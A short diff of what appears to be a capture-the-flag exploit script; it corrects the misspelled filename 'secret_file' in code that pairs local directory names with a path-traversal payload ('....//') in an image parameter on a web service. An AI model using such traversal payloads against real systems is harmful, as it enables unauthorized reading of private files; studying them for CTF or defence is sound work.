@@ -53,7 +53,7 @@ directory = '.'
 subdirectories = [x[0][2:] + '/' for x in os.walk(directory)]
 
 url = "https://hello-anya.fly.dev/?img=....//"
-filename = "sceret_file"
+filename = "secret_file"
 
 print(subdirectories)
 for subdirectory in subdirectories:
